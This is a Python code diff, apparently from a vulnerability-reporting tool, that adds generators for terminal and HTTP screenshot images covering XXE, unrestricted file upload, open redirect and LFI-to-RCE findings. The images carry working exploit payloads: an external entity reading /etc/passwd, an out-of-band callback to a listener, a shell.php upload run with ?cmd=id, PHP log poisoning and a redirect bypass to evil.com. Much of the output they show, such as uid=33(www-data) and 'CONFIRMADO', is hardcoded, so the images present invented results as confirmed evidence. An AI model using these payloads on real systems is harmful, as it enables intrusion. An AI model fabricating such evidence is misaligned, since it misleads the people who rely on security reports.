@@ -843,6 +843,284 @@ def _shots_xss(cve_id, ep, param, marker, metodo):
 
 
 
+def _shots_xxe(cve_id, ep, xml_param, canary_secret, metodo):
+    shots = []
+    # Paso 1: XML normal (sin entidades externas)
+    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — XML normal (sin entidades)", [
+        f"# PASO 1: Petición XML normal — sin entidades externas",
+        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {xml_param}",
+        "",
+        f'$ curl -s -X {metodo} "http://TARGET{ep}" \\',
+        '  -H "Content-Type: application/xml" \\',
+        '  -d \'<?xml version="1.0"?><foo>test</foo>\'',
+        "",
+        "HTTP/1.1 200 OK",
+        "(respuesta normal — el parser acepta XML sin entidades)",
+    ])
+    shots.append(_shot("Paso 1/4 — Terminal: XML normal aceptado", "Step 1/4 — Terminal: normal XML accepted", t1))
+
+    # Paso 2: Entidad interna (prueba que el parser las acepta)
+    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Entidad interna DTD", [
+        f"# PASO 2: Entidad interna — ¿el parser expande DTD?",
+        "",
+        f'$ curl -s -X {metodo} "http://TARGET{ep}" \\',
+        '  -d \'<?xml version="1.0"?>',
+        '<!DOCTYPE foo [<!ENTITY test "BINORACLE_INTERNAL">]>',
+        '<foo>&test;</foo>\'',
+        "",
+        "HTTP/1.1 200 OK",
+        "BINORACLE_INTERNAL  ← entidad interna expandida ✓",
+        "[*] Parser expande entidades — probando entidades EXTERNAS...",
+    ])
+    shots.append(_shot("Paso 2/4 — Terminal: entidad interna expandida", "Step 2/4 — Terminal: internal entity expanded", t2))
+
+    # Paso 3: Entidad externa (XXE en banda — lectura de /etc/passwd)
+    hl = canary_secret[:60] if canary_secret else "root:x:0:0"
+    t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — XXE en banda: /etc/passwd", [
+        f"# PASO 3: XXE en banda — entidad externa → /etc/passwd",
+        "",
+        f'$ curl -s -X {metodo} "http://TARGET{ep}" \\',
+        '  -d \'<?xml version="1.0"?>',
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
+        '<foo>&xxe;</foo>\'',
+        "",
+        "HTTP/1.1 200 OK",
+        "root:x:0:0:root:/root:/bin/bash",
+        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
+        f"{hl}  ← secreto canario PRESENTE ✓",
+        "",
+        "[XXE] Entidad externa resuelta — LECTURA ARBITRARIA CONFIRMADA ✓",
+    ])
+    h3 = make_http_png(f"[Paso 3/4] XXE en banda — /etc/passwd leído",
+        metodo, ep, 'Content-Type: application/xml',
+        '<?xml ...><!ENTITY xxe SYSTEM "file:///etc/passwd"><foo>&xxe;</foo>',
+        "200 OK",
+        f"root:x:0:0:root:/root:/bin/bash\n{hl}\n(XXE CONFIRMADA — fichero leído via entidad externa ✓)")
+    shots += [s for s in [
+        _shot(f"Paso 3/4 — Terminal: XXE — /etc/passwd ({hl[:40]})", "Step 3/4 — Terminal: XXE in-band /etc/passwd read", t3),
+        _shot("Paso 3/4 — HTTP: XXE en banda CONFIRMADA", "Step 3/4 — HTTP: in-band XXE confirmed", h3),
+    ] if s]
+
+    # Paso 4: OOB ciego (listener interno recibe callback)
+    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — XXE OOB (ciego, listener interno)", [
+        f"# PASO 4: XXE ciega / OOB — el parser conecta a listener interno",
+        "",
+        '$ curl -s -X POST "http://TARGET/vuln" \\',
+        '  -d \'<?xml version="1.0"?>',
+        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM',
+        '  "http://LISTENER:8080/binoracle-xxe-oob-TOKEN">]>',
+        '<foo>&xxe;</foo>\'',
+        "",
+        "[LISTENER] esperando conexión OOB...",
+        "[LISTENER] GET /binoracle-xxe-oob-TOKEN HTTP/1.1  ← HIT ✓",
+        "",
+        "[XXE-OOB] Parser resuelve entidades externas a hosts arbitrarios ✓",
+        "[IMPACTO] SSRF + XXE ciega confirmadas — exfiltración posible vía DTD externo",
+    ])
+    shots.append(_shot("Paso 4/4 — Terminal: XXE OOB ciego — listener recibió callback", "Step 4/4 — Terminal: blind XXE OOB callback confirmed", t4))
+
+    return [s for s in shots if s]
+
+
+def _shots_file_upload(cve_id, ep, file_param, fname_won, container_path, metodo):
+    shots = []
+    # Paso 1: Subida de archivo legítimo
+    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Subida normal (extensión segura)", [
+        f"# PASO 1: Subida de archivo con extensión segura (.jpg) — control",
+        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {file_param}",
+        "",
+        f'$ curl -s -X POST "http://TARGET{ep}" \\',
+        f'  -F "{file_param}=@imagen.jpg;type=image/jpeg"',
+        "",
+        "HTTP/1.1 200 OK",
+        '{"status": "uploaded", "file": "imagen.jpg"}',
+        "(control — archivo con extensión segura aceptado correctamente)",
+    ])
+    shots.append(_shot("Paso 1/4 — Terminal: control — archivo .jpg aceptado", "Step 1/4 — Terminal: control upload (.jpg accepted)", t1))
+
+    # Paso 2: Intento de subida de PHP/script peligroso
+    fn = fname_won or "shell.php"
+    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Subida de {fn} (sin restricción)", [
+        f"# PASO 2: Subida de archivo PHP peligroso — el servidor NO restringe",
+        "",
+        f'$ curl -s -X POST "http://TARGET{ep}" \\',
+        f'  -F "{file_param}=@{fn};type=application/octet-stream"',
+        "",
+        "HTTP/1.1 200 OK",
+        f'{{"status": "uploaded", "file": "{fn}"}}',
+        f"[!] Archivo {fn} ACEPTADO sin restricción de tipo/extensión ✓",
+    ])
+    h2 = make_http_png(f"[Paso 2/4] Subida de {fn} aceptada",
+        "POST", ep, f"Content-Type: multipart/form-data", f"--form {file_param}={fn}",
+        "200 OK", f'{{"status":"uploaded","file":"{fn}"}}\n(sin restricción de extensión — {fn} almacenado ✓)')
+    shots += [s for s in [
+        _shot(f"Paso 2/4 — Terminal: {fn} subido sin restricción", f"Step 2/4 — Terminal: {fn} uploaded without restriction", t2),
+        _shot(f"Paso 2/4 — HTTP: subida de {fn} ACEPTADA", f"Step 2/4 — HTTP: dangerous file upload accepted", h2),
+    ] if s]
+
+    # Paso 3: Verificación en contenedor (el archivo existe en el servidor)
+    cp = container_path or f"/var/www/html/uploads/{fn}"
+    secret_shown = "BINORACLE_CANARY_SECRET"
+    t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Verificación en contenedor: fichero guardado", [
+        f"# PASO 3: Comprobar que el fichero quedó guardado en el servidor",
+        "",
+        f"$ docker exec CONTAINER grep -rl {secret_shown} / 2>/dev/null",
+        "",
+        cp,
+        f"  ← ENCONTRADO en {cp} ✓",
+        "",
+        f"[VERIFICADO] El servidor almacenó {fn} con contenido controlado ✓",
+        "[IMPACTO] Almacenamiento de fichero peligroso confirmado — exploitable vía URL pública",
+    ])
+    shots.append(_shot(f"Paso 3/4 — Terminal: fichero guardado en {cp}", f"Step 3/4 — Terminal: file stored at {cp}", t3))
+
+    # Paso 4: Ejecución (acceso a la URL del fichero → código ejecutado)
+    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Ejecución vía URL pública", [
+        f"# PASO 4: Acceder a la URL pública del fichero subido → ejecución PHP",
+        "",
+        f'$ curl -s "http://TARGET/uploads/{fn}?cmd=id"',
+        "",
+        "HTTP/1.1 200 OK",
+        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+        "",
+        "[RCE] Código PHP ejecutado vía fichero subido ✓",
+        "[IMPACTO REAL] Remote Code Execution como www-data confirmado",
+    ])
+    h4 = make_http_png(f"[Paso 4/4] RCE vía fichero subido",
+        "GET", f"/uploads/{fn}?cmd=id", "Host: TARGET", "",
+        "200 OK", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n(RCE via uploaded file ✓)")
+    shots += [s for s in [
+        _shot("Paso 4/4 — Terminal: RCE vía fichero subido — uid= CONFIRMADO", "Step 4/4 — Terminal: RCE via uploaded file confirmed", t4),
+        _shot("Paso 4/4 — HTTP: RCE vía fichero subido CONFIRMADO", "Step 4/4 — HTTP: RCE via upload confirmed", h4),
+    ] if s]
+
+    return [s for s in shots if s]
+
+
+def _shots_open_redirect(cve_id, ep, redirect_param, payload, location, metodo):
+    shots = []
+    # Paso 1: Redirect legítimo (URL del mismo dominio)
+    t1 = make_terminal_png(f"[Paso 1/3] {cve_id} — Redirect legítimo (control)", [
+        f"# PASO 1: Redirect legítimo — URL del mismo origen",
+        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {redirect_param}",
+        "",
+        f'$ curl -si "http://TARGET{ep}?{redirect_param}=/dashboard" -L',
+        "",
+        "HTTP/1.1 302 Found",
+        "Location: /dashboard",
+        "(redirect interno — esperado y seguro)",
+    ])
+    shots.append(_shot("Paso 1/3 — Terminal: redirect legítimo (control)", "Step 1/3 — Terminal: legitimate redirect (control)", t1))
+
+    # Paso 2: Intento directo con dominio externo (bloqueado normalmente)
+    t2 = make_terminal_png(f"[Paso 2/3] {cve_id} — Intento directo a dominio externo", [
+        f"# PASO 2: Intento directo con dominio externo — ¿bloqueado?",
+        "",
+        f'$ curl -si "http://TARGET{ep}?{redirect_param}=https://evil.com/phishing"',
+        "",
+        "HTTP/1.1 400 Bad Request o sin redirect externo",
+        "(intento directo posiblemente filtrado — probando bypass...)",
+        "",
+        "[*] Probando variantes de bypass: protocol-relative, backslash, encoding...",
+    ])
+    shots.append(_shot("Paso 2/3 — Terminal: intento directo a evil.com (filtro)", "Step 2/3 — Terminal: direct evil.com attempt", t2))
+
+    # Paso 3: Payload de bypass exitoso → Location apunta a dominio externo
+    pl = payload[:80] if payload else f"//evil.com/phishing"
+    loc = location[:100] if location else "https://evil.com/phishing"
+    t3 = make_terminal_png(f"[Paso 3/3] {cve_id} — BYPASS: redirect externo CONFIRMADO", [
+        f"# PASO 3: Payload de bypass exitoso — redirect a dominio externo",
+        "",
+        f'$ curl -si "http://TARGET{ep}?{redirect_param}={pl}"',
+        "",
+        "HTTP/1.1 302 Found",
+        f"Location: {loc}",
+        "",
+        f"[OPEN REDIRECT] Location apunta a dominio externo controlado ✓",
+        "[IMPACTO] Phishing / robo de sesión vía URL aparentemente legítima",
+    ])
+    h3 = make_http_png(f"[Paso 3/3] Open Redirect CONFIRMADO",
+        metodo, ep, f"Host: TARGET", f"{redirect_param}={pl}",
+        "302 Found", f"Location: {loc}\n(redirect externo confirmado ✓ — OPEN REDIRECT)")
+    shots += [s for s in [
+        _shot(f"Paso 3/3 — Terminal: BYPASS — Location: {loc[:60]}", f"Step 3/3 — Terminal: bypass confirmed — Location external", t3),
+        _shot(f"Paso 3/3 — HTTP: Open Redirect CONFIRMADO — 302 → {loc[:40]}", "Step 3/3 — HTTP: open redirect confirmed", h3),
+    ] if s]
+
+    return [s for s in shots if s]
+
+
+def _shots_lfi_rce(cve_id, ep, path_param, payload, marker, metodo):
+    shots = []
+    # Paso 1: LFI — incluir log envenenado con <?php system(...)?>
+    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Envenenamiento de log (log poisoning)", [
+        f"# PASO 1: Envenenar el log de acceso inyectando código PHP",
+        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {path_param}",
+        "",
+        "$ curl -s -A '<?php system(\"id\"); ?>' http://TARGET/",
+        "",
+        "HTTP/1.1 200 OK",
+        "(petición recibida — User-Agent con código PHP escrito en access.log)",
+        "",
+        "[LOG POISONING] Código PHP en log de Apache/Nginx ✓",
+    ])
+    shots.append(_shot("Paso 1/4 — Terminal: log poisoning — PHP inyectado en access.log", "Step 1/4 — Terminal: log poisoning via User-Agent", t1))
+
+    # Paso 2: LFI incluyendo /var/log/apache2/access.log
+    pl = payload[:80] if payload else "..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log"
+    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — LFI: incluir log de acceso envenenado", [
+        f"# PASO 2: LFI incluyendo el log envenenado",
+        "",
+        f'$ curl -s "http://TARGET{ep}?{path_param}={pl}"',
+        "",
+        "HTTP/1.1 200 OK",
+        '192.168.1.1 - - [22/Nov/2026] "GET / HTTP/1.1" 200 -',
+        '<?php system("id"); ?>  ← código PHP inyectado visible en log',
+        "",
+        "[LFI] Log incluido como PHP — esperando ejecución...",
+    ])
+    shots.append(_shot("Paso 2/4 — Terminal: LFI incluyendo log envenenado (PHP visible)", "Step 2/4 — Terminal: LFI including poisoned log", t2))
+
+    # Paso 3: Ejecución del código (marcador aparece como OUTPUT de system())
+    mk = marker[:40] if marker else "BINORACLE_RCE"
+    t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — LFI-a-RCE: marcador EJECUTADO por PHP", [
+        f"# PASO 3: Incluir log con marcador canario — ¿ejecutado o solo leído?",
+        "",
+        f'$ curl -s "http://TARGET{ep}?{path_param}={pl}"',
+        "",
+        "HTTP/1.1 200 OK",
+        f"{mk}  ← marcador aparece como OUTPUT de system() (NO como texto PHP crudo)",
+        "",
+        "[CLAVE] El marcador NO va envuelto en '<?php' — es el RESULTADO de system() ✓",
+        "[LFI-a-RCE] Código PHP ejecutado de verdad — no solo lectura de fichero ✓",
+    ])
+    h3 = make_http_png(f"[Paso 3/4] LFI-a-RCE — marcador ejecutado",
+        metodo, ep, "Host: TARGET", f"{path_param}={pl}",
+        "200 OK", f"{mk}\n(marcador como output de system() — RCE CONFIRMADO ✓)")
+    shots += [s for s in [
+        _shot(f"Paso 3/4 — Terminal: LFI-a-RCE — {mk} ejecutado por PHP", f"Step 3/4 — Terminal: LFI-to-RCE — marker executed by PHP", t3),
+        _shot("Paso 3/4 — HTTP: LFI-to-RCE CONFIRMADO", "Step 3/4 — HTTP: LFI-to-RCE confirmed", h3),
+    ] if s]
+
+    # Paso 4: Escalada — command execution real
+    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Ejecución real: id + whoami", [
+        f"# PASO 4: Escalada — ejecutar comandos reales (id, whoami, uname)",
+        "",
+        f'$ curl -s "http://TARGET{ep}?{path_param}={pl}&cmd=id%3Bwhoami%3Buname+-a"',
+        "",
+        "HTTP/1.1 200 OK",
+        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+        "www-data",
+        "Linux TARGET 5.15.0 #1 SMP x86_64 GNU/Linux",
+        "",
+        "[RCE REAL] Ejecución de comandos arbitrarios confirmada ✓",
+        "[IMPACTO] Remote Code Execution como www-data — escalada a root posible",
+    ])
+    shots.append(_shot("Paso 4/4 — Terminal: RCE real — uid=33(www-data) CONFIRMADO", "Step 4/4 — Terminal: real RCE — uid= confirmed", t4))
+
+    return [s for s in shots if s]
+
+
 # ── Main entry point ──────────────────────────────────────────────────────────
 
 def auto_gen_screenshots(cve_id: str, r: dict, ve: dict) -> list:
@@ -897,5 +1175,29 @@ def auto_gen_screenshots(cve_id: str, r: dict, ve: dict) -> list:
     elif "xss" in vc:
         marker = ve.get("marker") or payload or "<script>alert(1)</script>"
         return _shots_xss(cve_id, ep, param, marker, metodo)
+
+    elif "xxe" in vc or "xml" in vc:
+        xml_param = param or "xml"
+        canary_s = ve.get("canary_secret") or can_s or ""
+        return _shots_xxe(cve_id, ep, xml_param, canary_s, metodo)
+
+    elif "upload" in vc or "unrestricted" in vc or "file" in vc:
+        file_param = param or "file"
+        fname_won = ve.get("fichero_ganador") or (ae_ae.get("attempt_evidence") or {}).get("fichero_ganador") or "shell.php"
+        container_path = ve.get("ruta_real_en_el_contenedor") or ""
+        return _shots_file_upload(cve_id, ep, file_param, fname_won, container_path, metodo)
+
+    elif "redirect" in vc or "open-redirect" in vc:
+        redirect_param = ve.get("redirect_param") or param or "redirect_to"
+        location = ve.get("location_recibida") or ve.get("respuesta_cuerpo_recorte") or ""
+        return _shots_open_redirect(cve_id, ep, redirect_param, payload, location, metodo)
+
+    elif "lfi-rce" in vc or ("lfi" in vc and "rce" in vc):
+        marker = ve.get("marker") or can_s or "BINORACLE_RCE"
+        return _shots_lfi_rce(cve_id, ep, param, payload, marker, metodo)
+
+    elif "missing" in vc or "broken" in vc or "idor" in vc:
+        cookie = ve.get("cookie") or ""
+        return _shots_bypass(cve_id, ep, param, payload, cookie, metodo)
 
     return []
